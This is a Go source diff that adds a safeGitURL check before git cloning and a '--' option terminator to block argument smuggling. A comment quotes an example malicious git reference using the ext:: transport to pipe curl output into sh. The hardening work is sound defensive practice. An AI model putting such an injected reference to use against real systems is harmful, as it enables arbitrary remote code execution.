@@ -564,6 +564,15 @@ func resolveBundleRef(ref, cacheDir string, out io.Writer) (string, error) {
 		}
 		return abs, nil
 	}
+	// SECURITY: gate every git resolution through the SAME safeGitURL guard
+	// clonePack uses. isGitURL is a loose CLASSIFIER (anything ending ".git"
+	// qualifies), so without this gate a reference like
+	// `ext::sh -c 'curl x|sh' %G.git` would be handed to `git clone`, whose
+	// ext::/fd:: transport helpers execute arbitrary commands. This hardens
+	// both `knowledge use` and pack [[knowledge]] shared refs.
+	if !safeGitURL(ref) {
+		return "", fmt.Errorf("refusing unsafe git URL %q (only https/ssh/git remotes; no ext::/file:: transports or local-as-remote)", redactURL(ref))
+	}
 	if _, err := exec.LookPath("git"); err != nil {
 		return "", fmt.Errorf("git not found on PATH — needed to clone %s; install git", ref)
 	}
@@ -884,8 +893,15 @@ func canonicalBundleIDs(paths []string) []string {
 // config.RedactURL so the launcher and host binary redact identically.
 func redactURL(u string) string { return config.RedactURL(u) }
 
+// gitCloneArgs builds gitClone's argv. The `--` terminates option parsing so a
+// URL beginning with a dash can never be smuggled in as a git option
+// (defense-in-depth behind safeGitURL). Pure so it is unit-testable.
+func gitCloneArgs(url, dest string) []string {
+	return []string{"clone", "-q", "--", url, dest}
+}
+
 func gitClone(url, dest string) error {
-	return exec.Command("git", "clone", "-q", url, dest).Run()
+	return exec.Command("git", gitCloneArgs(url, dest)...).Run()
 }
 
 func gitPull(dir string) error {
